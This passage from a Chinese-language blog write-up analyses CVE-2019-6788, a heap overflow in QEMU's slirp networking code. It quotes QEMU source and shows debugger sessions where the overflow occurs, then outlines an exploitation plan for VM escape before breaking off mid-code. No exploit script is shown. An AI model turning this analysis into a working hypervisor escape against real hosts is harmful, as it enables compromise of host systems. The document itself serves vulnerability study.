class="line">        m_free(m);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从函数逻辑中我们可以看到，函数首先是将<code>m-&gt;m_data</code>拷贝到<code>so_rcv-&gt;sb_wptr</code>中。<code>so_rcv</code>的数据结构为<code>sbuf</code>用来保存<code>tcp</code>网络层的数据，<code>m</code>的数据结构为<code>mbuf</code>用来保存<code>ip</code>传输层的数据，如果<code>data</code>中包含有<code>\r\n</code>则会对<code>sb_cc</code>进行赋值。我们发送的<code>payload</code>中不含含有<code>\r\n</code>，因此这里不会进行赋值。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sbuf</span> &#123;</span></span><br><span class="line">	<span class="type">uint32_t</span> sb_cc;		<span class="comment">/* actual chars in buffer */</span></span><br><span class="line">	<span class="type">uint32_t</span> sb_datalen;	<span class="comment">/* Length of data  */</span></span><br><span class="line">	<span class="type">char</span>	*sb_wptr;	<span class="comment">/* write pointer. points to where the next</span></span><br><span class="line"><span class="comment">				 * bytes should be written in the sbuf */</span></span><br><span class="line">	<span class="type">char</span>	*sb_rptr;	<span class="comment">/* read pointer. points to where the next</span></span><br><span class="line"><span class="comment">				 * byte should be read from the sbuf */</span></span><br><span class="line">	<span class="type">char</span>	*sb_data;	<span class="comment">/* Actual data */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> &#123;</span></span><br><span class="line">	<span class="comment">/* XXX should union some of these! */</span></span><br><span class="line">	<span class="comment">/* header at beginning of each mbuf: */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span>	<span class="title">mbuf</span> *<span class="title">m_next</span>;</span>		<span class="comment">/* Linked list of mbufs */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span>	<span class="title">mbuf</span> *<span class="title">m_prev</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span>	<span class="title">mbuf</span> *<span class="title">m_nextpkt</span>;</span>	<span class="comment">/* Next packet in queue/record */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span>	<span class="title">mbuf</span> *<span class="title">m_prevpkt</span>;</span>	<span class="comment">/* Flags aren&#x27;t used in the output queue */</span></span><br><span class="line">	<span class="type">int</span>	m_flags;		<span class="comment">/* Misc flags */</span></span><br><span class="line"></span><br><span class="line">	<span class="type">int</span>	m_size;			<span class="comment">/* Size of mbuf, from m_dat or m_ext */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span>	<span class="title">socket</span> *<span class="title">m_so</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="type">caddr_t</span>	m_data;			<span class="comment">/* Current location of data */</span></span><br><span class="line">	<span class="type">int</span>	m_len;			<span class="comment">/* Amount of data in this mbuf, from m_data */</span></span><br><span class="line"></span><br><span class="line">	Slirp *slirp;</span><br><span class="line">	<span class="type">bool</span>	resolution_requested;</span><br><span class="line">	<span class="type">uint64_t</span> expiration_date;</span><br><span class="line">	<span class="type">char</span>   *m_ext;</span><br><span class="line">	<span class="comment">/* start of dynamic buffer area, must be last element */</span></span><br><span class="line">	<span class="type">char</span>    m_dat[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>在进行<code>memcpy</code>数据拷贝之前会进行<code>buf</code>剩余空间大小的判断，我们来看一下<code>tcp_emu</code>函数的调用函数<code>tcp_input</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//slirp/tcp_input.c</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (ti-&gt;ti_ack == tp-&gt;snd_una &amp;&amp;</span><br><span class="line">         tcpfrag_list_empty(tp) &amp;&amp;</span><br><span class="line">         ti-&gt;ti_len &lt;= sbspace(&amp;so-&gt;so_rcv)) &#123;<span class="comment">// 这里计算了buf的剩余空间大小</span></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * this is a pure, in-sequence data packet</span></span><br><span class="line"><span class="comment">			 * with nothing on the reassembly queue and</span></span><br><span class="line"><span class="comment">			 * we have enough buffer space to take it.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">  tp-&gt;rcv_nxt += ti-&gt;ti_len;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Add data to socket buffer.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">  <span class="keyword">if</span> (so-&gt;so_emu) &#123;</span><br><span class="line">    <span class="keyword">if</span> (tcp_emu(so,m)) sbappend(so, m);</span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">    sbappend(so, m);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * If this is a short packet, then ACK now - with Nagel</span></span><br><span class="line"><span class="comment">			 *	congestion avoidance sender won&#x27;t send more until</span></span><br><span class="line"><span class="comment">			 *	he gets an ACK.</span></span><br><span class="line"><span class="comment">			 *</span></span><br><span class="line"><span class="comment">			 * It is better to not delay acks at all to maximize</span></span><br><span class="line"><span class="comment">			 * TCP throughput.  See RFC 2581.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">  tp-&gt;t_flags |= TF_ACKNOW;</span><br><span class="line">  tcp_output(tp);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的<code>ti</code>的结构体是<code>tcpiphdr</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tcpiphdr</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mbuf_ptr</span> <span class="title">ih_mbuf</span>;</span>	<span class="comment">/* backpointer to mbuf */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span>  <span class="title">in_addr</span> <span class="title">ih_src</span>;</span> <span class="comment">/* source internet address */</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span>  <span class="title">in_addr</span> <span class="title">ih_dst</span>;</span> <span class="comment">/* destination internet address */</span></span><br><span class="line">            <span class="type">uint8_t</span> ih_x1;          <span class="comment">/* (unused) */</span></span><br><span class="line">            <span class="type">uint8_t</span> ih_pr;          <span class="comment">/* protocol */</span></span><br><span class="line">        &#125; ti_i4;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span>  <span class="title">in6_addr</span> <span class="title">ih_src</span>;</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span>  <span class="title">in6_addr</span> <span class="title">ih_dst</span>;</span></span><br><span class="line">            <span class="type">uint8_t</span> ih_x1;</span><br><span class="line">            <span class="type">uint8_t</span> ih_nh;</span><br><span class="line">        &#125; ti_i6;</span><br><span class="line">    &#125; ti;</span><br><span class="line">    <span class="type">uint16_t</span>    ti_x0;</span><br><span class="line">    <span class="type">uint16_t</span>    ti_len;             <span class="comment">/* protocol length */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>      <span class="title">tcphdr</span> <span class="title">ti_t</span>;</span>        <span class="comment">/* tcp header */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>spspace</code>的定义如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> sbspace(sb) ((sb)-&gt;sb_datalen - (sb)-&gt;sb_cc)</span></span><br></pre></td></tr></table></figure>

<p><code>ti_len</code>表示的是协议的长度，因为我们输入的<code>payload</code>中没有<code>\r\n</code>因此这里的<code>sb_cc</code>恒定为<code>0</code>。从<code>tcp_input</code>到<code>tcp_emu</code>函数，显示调用了<code>sbspace</code>函数判断<code>buf</code>的剩余空间的大小是否满足要求，如果满足要求那么就会调用<code>tcp_emu-&gt;memcpy</code>函数进行数据的拷贝。</p>
<p>但是这里存在一个问题，就是数据拷贝结束之后，如果<code>data</code>中不包含<code>\r or \n</code>字符串，那么就不会对<code>sb_cc</code>进行操作，也就是不会加上拷贝的数据的长度。当用户多次调用<code>tcp_input</code>函数进行数据写入的时候，第二次调用<code>sbspace</code>函数计算得到的<code>data</code>的剩余的空间的大小就不是真正的剩余空间的大小。条件判断恒成立，多次调用<code>memcpy</code>就会导致堆溢出。</p>
<p>动态调试一下，断点设置在<code>tcp_input</code>的条件判断处和<code>tcp_emu</code>的<code>memcpy</code>处</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b tcp_subr.c:<span class="number">638</span></span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0x5606efa01da9</span>: file /root/pwn/qemu/qemu/slirp/tcp_subr.c, line <span class="number">638.</span></span><br><span class="line">pwndbg&gt; b tcp_input.c:<span class="number">558</span></span><br><span class="line">Breakpoint <span class="number">2</span> at <span class="number">0x5606ef9fe14c</span>: file /root/pwn/qemu/qemu/slirp/tcp_input.c, line <span class="number">558</span></span><br></pre></td></tr></table></figure>

<p>第一次断点</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x *ti</span><br><span class="line">$<span class="number">3</span> = &#123;</span><br><span class="line">  ih_mbuf = &#123;</span><br><span class="line">    mptr = <span class="number">0x0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  ti = &#123;</span><br><span class="line">    ti_i4 = &#123;</span><br><span class="line">      ih_src = &#123;</span><br><span class="line">        s_addr = <span class="number">0xf02000a</span></span><br><span class="line">      &#125;,</span><br><span class="line">      ih_dst = &#123;</span><br><span class="line">        s_addr = <span class="number">0x202000a</span></span><br><span class="line">      &#125;,</span><br><span class="line">      ih_x1 = <span class="number">0x0</span>,</span><br><span class="line">      ih_pr = <span class="number">0x6</span></span><br><span class="line">    &#125;,</span><br><span class="line">    ti_i6 = &#123;</span><br><span class="line">      ih_src = &#123;</span><br><span class="line">        __in6_u = &#123;</span><br><span class="line">          __u6_addr8 = &#123;<span class="number">0xa</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0xf</span>, <span class="number">0xa</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x6</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>&#125;,</span><br><span class="line">          __u6_addr16 = &#123;<span class="number">0xa</span>, <span class="number">0xf02</span>, <span class="number">0xa</span>, <span class="number">0x202</span>, <span class="number">0x600</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>&#125;,</span><br><span class="line">          __u6_addr32 = &#123;<span class="number">0xf02000a</span>, <span class="number">0x202000a</span>, <span class="number">0x600</span>, <span class="number">0x0</span>&#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      ih_dst = &#123;</span><br><span class="line">        __in6_u = &#123;</span><br><span class="line">          __u6_addr8 = &#123;<span class="number">0x0</span> &lt;repeats <span class="number">16</span> times&gt;&#125;,</span><br><span class="line">          __u6_addr16 = &#123;<span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>&#125;,</span><br><span class="line">          __u6_addr32 = &#123;<span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>&#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      ih_x1 = <span class="number">0x0</span>,</span><br><span class="line">      ih_nh = <span class="number">0x0</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  ti_x0 = <span class="number">0x0</span>,</span><br><span class="line">  ti_len = <span class="number">0x500</span>,</span><br><span class="line">  <span class="type">ti_t</span> = &#123;</span><br><span class="line">    th_sport = <span class="number">0xe897</span>,</span><br><span class="line">    th_dport = <span class="number">0x7100</span>,</span><br><span class="line">    th_seq = <span class="number">0x5c63c5b6</span>,</span><br><span class="line">    th_ack = <span class="number">0x772402</span>,</span><br><span class="line">    th_x2 = <span class="number">0x0</span>,</span><br><span class="line">    th_off = <span class="number">0x5</span>,</span><br><span class="line">    th_flags = <span class="number">0x18</span>,</span><br><span class="line">    th_win = <span class="number">0xfaf0</span>,</span><br><span class="line">    th_sum = <span class="number">0xbb95</span>,</span><br><span class="line">    th_urp = <span class="number">0x0</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里的<code>ti_len</code>的大小就是我们输入的<code>0x500</code>，再来看一下<code>so-&gt;so_recv</code>的成员变量的值。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x so-&gt;so_rcv</span><br><span class="line">$<span class="number">5</span> = &#123;</span><br><span class="line">  sb_cc = <span class="number">0x0</span>,</span><br><span class="line">  sb_datalen = <span class="number">0x2238</span>,</span><br><span class="line">  sb_wptr = <span class="number">0x7f688a4150f0</span>,</span><br><span class="line">  sb_rptr = <span class="number">0x7f688a4150f0</span>,</span><br><span class="line">  sb_data = <span class="number">0x7f688a4150f0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们看到初始时候的<code>buf</code>大小为<code>0x2238</code>，<code>su_cc</code>为<code>0</code>。<code>memcpy</code>断点执行完毕之后，可以看到我们的数据已经拷贝进入。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *m</span><br><span class="line">$<span class="number">9</span> = &#123;</span><br><span class="line">  m_next = <span class="number">0x7f6889ff6800</span>,</span><br><span class="line">  m_prev = <span class="number">0x5606f07b6a38</span>,</span><br><span class="line">  m_nextpkt = <span class="number">0x0</span>,</span><br><span class="line">  m_prevpkt = <span class="number">0x0</span>,</span><br><span class="line">  m_flags = <span class="number">4</span>,</span><br><span class="line">  m_size = <span class="number">1544</span>,</span><br><span class="line">  m_so = <span class="number">0x7f688a3f8a50</span>,</span><br><span class="line">  m_data = <span class="number">0x5606f19888b4</span> <span class="string">&#x27;A&#x27;</span> &lt;repeats <span class="number">200</span> times&gt;...,</span><br><span class="line">  m_len = <span class="number">1280</span>,</span><br><span class="line">  slirp = <span class="number">0x5606f07b6990</span>,</span><br><span class="line">  resolution_requested = <span class="literal">false</span>,</span><br><span class="line">  expiration_date = <span class="number">18446744073709551615</span>,</span><br><span class="line">  m_ext = <span class="number">0x5606f1988870</span> <span class="string">&quot;&quot;</span>,</span><br><span class="line">  m_dat = <span class="number">0x5606f1988860</span> <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p so-&gt;so_rcv</span><br><span class="line">$<span class="number">10</span> = &#123;</span><br><span class="line">  sb_cc = <span class="number">0</span>,</span><br><span class="line">  sb_datalen = <span class="number">8760</span>,</span><br><span class="line">  sb_wptr = <span class="number">0x7f688a4150f0</span> <span class="string">&#x27;A&#x27;</span> &lt;repeats <span class="number">200</span> times&gt;...,</span><br><span class="line">  sb_rptr = <span class="number">0x7f688a4150f0</span> <span class="string">&#x27;A&#x27;</span> &lt;repeats <span class="number">200</span> times&gt;...,</span><br><span class="line">  sb_data = <span class="number">0x7f688a4150f0</span> <span class="string">&#x27;A&#x27;</span> &lt;repeats <span class="number">200</span> times&gt;...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行到第二次<code>tcp_input</code>条件判断处</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x so-&gt;so_rcv</span><br><span class="line">$<span class="number">12</span> = &#123;</span><br><span class="line">  sb_cc = <span class="number">0x0</span>,</span><br><span class="line">  sb_datalen = <span class="number">0x2238</span>,</span><br><span class="line">  sb_wptr = <span class="number">0x7f688a4155f0</span>,</span><br><span class="line">  sb_rptr = <span class="number">0x7f688a4155f0</span>,</span><br><span class="line">  sb_data = <span class="number">0x7f688a4150f0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以看到这里的<code>sb_cc</code>为<code>0</code>，但是<code>wptr</code>即写指针已经增加了<code>0x500</code>，那么经过几次的拷贝就会造成堆溢出，覆盖某些关键的结构体造成<code>crash</code>。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>程序基本上开启了全部的保护</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; checksec</span><br><span class="line">[*] <span class="string">&#x27;/root/pwn/qemu/qemu-system-x86_64&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>要想实现程序的任意代码执行，首先需要信息泄漏得到<code>libc</code>基址和程序基址等信息，然后利用堆溢出控制程序的执行流。整个漏洞的利用包含四个部分</p>
<ul>
<li><code>malloc</code>原语</li>
<li>任意地址写</li>
<li>信息泄漏</li>
<li>控制程序执行流程</li>
</ul>
<h3 id="malloc-原语"><a href="#malloc-原语" class="headerlink" title="malloc 原语"></a>malloc 原语</h3><p><code>qemu</code>的堆排布非常的复杂，因此如果我们想要控制堆块布局就需要首先将堆内存清空，使得堆的申请都是从<code>top chunk</code>中进行分配，那么这样的堆布局就是可控和可预测的了。我们可以通过<code>ip</code>分片在<code>slirp</code>中的实现来构造<code>malloc</code>原语。</p>
<p>首先我们看一下<code>ip</code>数据包的结构</p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/CVE-2019-6788-Qemu%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E5%88%86%E6%9E%90/1.jpg" alt="图片无法显示，请联系作者" title=" ">

<p><code>ip</code>数据包的长度<code>total length</code>使用两字节表示，即最大为<code>65535</code>字节，一旦发送的长度超过这个字节就需要对数据包进行分段传输。主要关注以下<code>Flags</code>的标志位和<code>Fragment Offset</code></p>
<ul>
<li><code>zero</code>：未使用，置为<code>0</code></li>
<li><code>Do not fragment flag</code>：表示数据包是否为分片数据包，当置为<code>1</code>的时候未分片，简写为<code>DF</code>标志位</li>
<li><code>More fragments following flag</code>：表示后续还有无分片数据包，有的话置为<code>1</code>，简写为<code>MF</code>标志位</li>
<li><code>Fragment Offset</code>：分段偏移即当前数据包在整个大数据包中的偏移</li>
</ul>
<p><code>ip</code>数据包的数据结构源码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> HOST_WORDS_BIGENDIAN</span></span><br><span class="line">	<span class="type">uint8_t</span> ip_v:<span class="number">4</span>,			<span class="comment">/* version */</span></span><br><span class="line">		ip_hl:<span class="number">4</span>;		<span class="comment">/* header length */</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	<span class="type">uint8_t</span> ip_hl:<span class="number">4</span>,		<span class="comment">/* header length */</span></span><br><span class="line">		ip_v:<span class="number">4</span>;			<span class="comment">/* version */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">uint8_t</span>		ip_tos;			<span class="comment">/* type of service */</span></span><br><span class="line">	<span class="type">uint16_t</span>	ip_len;			<span class="comment">/* total length */</span></span><br><span class="line">	<span class="type">uint16_t</span>	ip_id;			<span class="comment">/* identification */</span></span><br><span class="line">	<span class="type">uint16_t</span>	ip_off;			<span class="comment">/* fragment offset field */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	IP_DF 0x4000			<span class="comment">/* don&#x27;t fragment flag */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	IP_MF 0x2000			<span class="comment">/* more fragments flag */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	IP_OFFMASK 0x1fff		<span class="comment">/* mask for fragmenting bits */</span></span></span><br><span class="line">	<span class="type">uint8_t</span> ip_ttl;			<span class="comment">/* time to live */</span></span><br><span class="line">	<span class="type">uint8_t</span> ip_p;			<span class="comment">/* protocol */</span></span><br><span class="line">	<span class="type">uint16_t</span>	ip_sum;			<span class="comment">/* checksum */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span>	<span class="title">in_addr</span> <span class="title">ip_src</span>,<span class="title">ip_dst</span>;</span>	<span class="comment">/* source and dest address */</span></span><br><span class="line">&#125; QEMU_PACKED;</span><br></pre></td></tr></table></figure>

<p>其中<code>ip</code>数据包分段的实现在<code>strip/ip_input.c</code>中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">ip_input</span><span class="params">(<span class="keyword">struct</span> mbuf *m)</span></span><br><span class="line">&#123;</span><br><span class="line">	Slirp *slirp = m-&gt;slirp;</span><br><span class="line">	<span class="keyword">register</span> <span class="class"><span class="keyword">struct</span> <span class="title">ip</span> *<span class="title">ip</span>;</span></span><br><span class="line">	<span class="type">int</span> hlen;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If offset or IP_MF are set, must reassemble.</span></span><br><span class="line"><span class="comment">	 * Otherwise, nothing need be done.</span></span><br><span class="line"><span class="comment">	 * (We could look in the reassembly queue to see</span></span><br><span class="line"><span class="comment">	 * if the packet was previously fragmented,</span></span><br><span class="line"><span class="comment">	 * but it&#x27;s not worth the time; just let them time out.)</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * XXX This should fail, don&#x27;t fragment yet</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (ip-&gt;ip_off &amp;~ IP_DF) &#123;</span><br><span class="line">	  <span class="keyword">register</span> <span class="class"><span class="keyword">struct</span> <span class="title">ipq</span> *<span class="title">fp</span>;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">qlink</span> *<span class="title">l</span>;</span></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Look for queue of fragments</span></span><br><span class="line"><span class="comment">		 * of this datagram.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">for</span> (l = slirp-&gt;ipq.ip_link.next; l != &amp;slirp-&gt;ipq.ip_link;</span><br><span 